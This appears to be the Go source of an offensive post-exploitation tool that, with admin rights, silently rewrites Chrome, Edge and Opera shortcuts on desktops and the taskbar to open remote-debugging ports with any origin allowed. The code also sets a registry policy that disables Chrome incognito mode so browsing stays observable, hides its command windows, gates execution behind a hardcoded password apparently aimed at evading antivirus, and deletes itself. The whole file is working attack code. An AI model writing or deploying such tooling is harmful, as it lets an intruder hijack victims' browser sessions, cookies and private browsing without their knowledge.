package main

import (
	"flag"
	"fmt"
	"github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"
	"lnkcom/utils"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
)

var (
	userpath string //用户自定义路径
	passwd   string
	lnkname  string //用户自定义
	port     string
	username string
	bypass   bool
	nobypass bool
)

const runpass = "fuck360"

func init() {
	logo := "__________                                           ________        ___.                 \n\\______   \\_______  ______  _  ________ ___________  \\______ \\   ____\\_ |__  __ __  ____  \n |    |  _/\\_  __ \\/  _ \\ \\/ \\/ /  ___// __ \\_  __ \\  |    |  \\_/ __ \\| __ \\|  |  \\/ ___\\ \n |    |   \\ |  | \\(  <_> )     /\\___ \\\\  ___/|  | \\/  |    `   \\  ___/| \\_\\ \\  |  / /_/  >\n |______  / |__|   \\____/ \\/\\_//____  >\\___  >__|    /_______  /\\___  >___  /____/\\___  / \n        \\/                          \\/     \\/                \\/     \\/    \\/     /_____/  \n\n"
	flag.StringVar(&passwd, "a", "", "a")
	flag.StringVar(&port, "p", "9222", "port")
	flag.StringVar(&lnkname, "l", "", "name")
	flag.StringVar(&username, "u", "", "username")
	flag.StringVar(&userpath, "path", "", "path") //自定义路径
	flag.BoolVar(&bypass, "bypass", false, "bypass google.")
	flag.BoolVar(&nobypass, "nobypass", false, "no bypass google.")
	flag.Parse()
	if passwd != runpass {
		os.Exit(0)
	}
	fmt.Println(logo)
	fmt.Println("--------------------------------------------------V2.6------------------------------------------------------------")
}
func main() {
	if !utils.CheckHighPriv() {
		fmt.Println("[Log] You Need UAC!!!")
		os.Exit(1)
	}
	if lnkname != "" {
		OpenLnkDebug(lnkname, username)
		return
	}
	if nobypass {
		BypassGoogle(true)
		return
	}
	if bypass {
		BypassGoogle(false)
		return
	}
	if username != "" {
		OpenLnkDebug("", username)
	} else if userpath != "" {
		UserEditPath(userpath)
	} else {
		OpenLnkDebug("", "")
		utils.DeleteSelf() //删除自身
		return
	}
}

// BypassGoogle 限制谷歌浏览器隐私模式（ps：目标可能会重装.）
func BypassGoogle(delete bool) {
	regPath := "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Google\\Chrome"
	regValue := "IncognitoModeAvailability"
	// 检查注册表键是否存在
	cmd := exec.Command("reg", "query", regPath, "/v", regValue)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, err := cmd.Output()
	if err == nil {
		// 如果命令执行成功，表示键已存在
		fmt.Println("[Log] Registry key already exists. Exiting...")
		if delete {
			deleteCmd := exec.Command("reg", "delete", regPath, "/v", regValue, "/f")
			deleteErr := deleteCmd.Run()
			if deleteErr != nil {
				fmt.Println("Failed to delete registry key:", deleteErr)
				return
			}
			fmt.Println("[Log] Nobypass Deleted successfully.")
		}
		return
	}
	if delete {
		fmt.Println("[Log] No Bypass Google Chrome.")
		return
	}
	// 键不存在，执行添加操作
	regType := "REG_DWORD"
	regData := "1"
	addCmd := exec.Command("reg", "add", regPath, "/v", regValue, "/t", regType, "/d", regData)
	addCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	addErr := addCmd.Run()
	if addErr != nil {
		fmt.Println("[Log] Failed to add registry key:", addErr)
		return
	}
	fmt.Println("[Log] Bypass Google Chrome Privacy Mode Successfully.Please restart the browser.")
}

func UserEditPath(userpath string) {
	ole.CoInitializeEx(0, ole.COINIT_APARTMENTTHREADED|ole.COINIT_SPEED_OVER_MEMORY)
	defer ole.CoUninitialize()
	shell, err := oleutil.CreateObject("WScript.Shell")
	if err != nil {
		fmt.Println("[Log] Failed to create Shell object:", err)
		return
	}
	defer shell.Release()

	shortcutDisp, err := shell.QueryInterface(ole.IID_IDispatch)
	if err != nil {
		fmt.Println("[Log] Failed to query interface:", err)
		return
	}
	defer shortcutDisp.Release()
	fmt.Println("[Log] Path Url:", userpath)
	shortcut, err := oleutil.CallMethod(shortcutDisp, "CreateShortcut", userpath)
	if err != nil {
		fmt.Printf("[Log] Failed to create shortcut object for %s: %v\n", userpath, err)
		return
	}
	//defer shortcut.Clear()

	shortcutObj := shortcut.ToIDispatch()
	if err != nil {
		//fmt.Printf("[Log] Failed to convert shortcut object for %s to IDispatch: %v\n", browserName, err)
		return
	}
	defer shortcutObj.Release()
	ports, err := strconv.Atoi(port) //获取开启的端口
	targetPath := oleutil.MustGetProperty(shortcutObj, "TargetPath").ToString()
	targetargs := oleutil.MustGetProperty(shortcutObj, "Arguments").ToString()
	debugEnabled := false

	// 检查 lnk 文件中是否开启了 debug 模式
	if targetargs != "" && strings.Contains(targetargs, "--remote-debugging-port=") {
		debugEnabled = true
	}
	if debugEnabled {
		fmt.Printf("[Log] Debug mode is already enabled for")
		fmt.Printf("[Log] Debug command: %s\n", targetargs)
	} else {
		err = os.Remove(userpath)
		if err != nil {
			fmt.Printf("[Log] Failed to remove original shortcut: %v\n", err)
			return
		}
		ports = ports + 1
		port = strconv.Itoa(ports)
		// 设置新的目标路径，加入调试模式参数
		debugTargetPath := `"` + targetPath + `"`
		arguments := `--remote-debugging-port=` + port + ` --remote-allow-origins=*`
		targetargs = targetargs + " " + arguments
		oleutil.PutProperty(shortcutObj, "TargetPath", debugTargetPath)
		oleutil.PutProperty(shortcutObj, "Arguments", targetargs)
		//oleutil.PutProperty(shortcutObj, "TargetPath", debugTargetPath)

		_, err = oleutil.CallMethod(shortcutObj, "Save")

		if err != nil {
			fmt.Println("[Log] Failed to save shortcut")
			return
		}

		fmt.Printf("[Log] Modified shortcut  successfully.Port: %s\n", port)
	}
}

// OpenLnkDebug Com组件替换浏览器快捷方式开启debug
func OpenLnkDebug(lnkname string, username string) {
	ole.CoInitializeEx(0, ole.COINIT_APARTMENTTHREADED|ole.COINIT_SPEED_OVER_MEMORY)
	defer ole.CoUninitialize()

	shell, err := oleutil.CreateObject("WScript.Shell")
	if err != nil {
		fmt.Println("[Log] Failed to create Shell object:", err)
		return
	}
	defer shell.Release()

	shortcutDisp, err := shell.QueryInterface(ole.IID_IDispatch)
	if err != nil {
		fmt.Println("[Log] Failed to query interface:", err)
		return
	}
	defer shortcutDisp.Release()

	currentUser, err := user.Current()
	if err != nil {
		fmt.Println("Failed to get current user:", err)
		return
	}

	desktopPathStr := filepath.Join(currentUser.HomeDir, "Desktop")
	appDataDir := os.Getenv("APPDATA")
	taskBarDir := filepath.Join(appDataDir, "Microsoft", "Internet Explorer", "Quick Launch", "User Pinned", "TaskBar")
	if username != "" {
		desktopPathStr = "C:\\Users\\" + username + "\\Desktop"
		appDataDir = "C:\\Users\\" + username + "\\AppData\\Roaming"
		taskBarDir = filepath.Join(appDataDir, "Microsoft", "Internet Explorer", "Quick Launch", "User Pinned", "TaskBar")
	}
	publicDesktopDir := "C:\\Users\\Public\\Desktop"

	fmt.Println("[Log] Desktop Url:", desktopPathStr)
	fmt.Println("[Log] Quick Url:", taskBarDir)
	fmt.Println("----------------------------------------------------------------------------------------------------------------")
	var browsers map[string]string

	ports, err := strconv.Atoi(port) //获取开启的端口
	if lnkname != "" {
		browsers = map[string]string{
			"Public " + lnkname: filepath.Join(publicDesktopDir, lnkname+".lnk"),
			"User " + lnkname:   filepath.Join(desktopPathStr, lnkname+".lnk"),
			"Quick " + lnkname:  filepath.Join(taskBarDir, lnkname+".lnk"),
			// 添加其他浏览器的快捷方式
		}
	} else {
		browsers = map[string]string{
			"Public Chrome": filepath.Join(publicDesktopDir, "Google Chrome.lnk"),
			"Public Edge":   filepath.Join(publicDesktopDir, "Microsoft Edge.lnk"),
			"Public Opera":  filepath.Join(publicDesktopDir, "Opera.lnk"),
			"User Chrome":   filepath.Join(desktopPathStr, "Google Chrome.lnk"),
			"User Edge":     filepath.Join(desktopPathStr, "Microsoft Edge.lnk"),
			"User Opera":    filepath.Join(desktopPathStr, "Opera.lnk"),
			"Quick Chrome":  filepath.Join(taskBarDir, "Google Chrome.lnk"),
			"Quick Edge":    filepath.Join(taskBarDir, "Microsoft Edge.lnk"),
			"Quick Opera":   filepath.Join(taskBarDir, "Opera.lnk"),
			// 添加其他浏览器的快捷方式
		}
	}
	for browserName, shortcutName := range browsers {
		if _, err := os.Stat(shortcutName); os.IsNotExist(err) {
			//fmt.Printf("Shortcut for %s does not exist.\n", browserName)
			continue
		}

		shortcut, err := oleutil.CallMethod(shortcutDisp, "CreateShortcut", shortcutName)
		if err != nil {
			fmt.Printf("[Log] Failed to create shortcut object for %s: %v\n", browserName, err)
			continue
		}
		//defer shortcut.Clear()

		shortcutObj := shortcut.ToIDispatch()
		if err != nil {
			fmt.Printf("[Log] Failed to convert shortcut object for %s to IDispatch: %v\n", browserName, err)
			continue
		}
		defer shortcutObj.Release()

		targetPath := oleutil.MustGetProperty(shortcutObj, "TargetPath").ToString()
		targetargs := oleutil.MustGetProperty(shortcutObj, "Arguments").ToString()
		debugEnabled := false

		// 检查 lnk 文件中是否开启了 debug 模式
		if targetargs != "" && strings.Contains(targetargs, "--remote-debugging-port=") {
			debugEnabled = true
		}
		if debugEnabled {
			fmt.Printf("[Log] Debug mode is already enabled for [%s].\n", browserName)
			fmt.Printf("[Log] Debug command: %s\n", targetargs)
		} else {
			err = os.Remove(shortcutName)
			if err != nil {
				fmt.Printf("[Log] Failed to remove original shortcut for %s: %v\n", browserName, err)
				continue
			}
			ports = ports + 1
			port = strconv.Itoa(ports)
			// 设置新的目标路径，加入调试模式参数
			debugTargetPath := `"` + targetPath + `"`
			arguments := `--remote-debugging-port=` + port + ` --remote-allow-origins=*`
			targetargs = targetargs + " " + arguments
			oleutil.PutProperty(shortcutObj, "TargetPath", debugTargetPath)
			oleutil.PutProperty(shortcutObj, "Arguments", targetargs)
			//oleutil.PutProperty(shortcutObj, "TargetPath", debugTargetPath)

			_, err = oleutil.CallMethod(shortcutObj, "Save")

			if err != nil {
				fmt.Printf("[Log] Failed to save shortcut for [%s]: %v\n", browserName, err)
				continue
			}

			fmt.Printf("[Log] Modified shortcut for [%s] successfully.Port: %s\n", browserName, port)
		}
	}
}
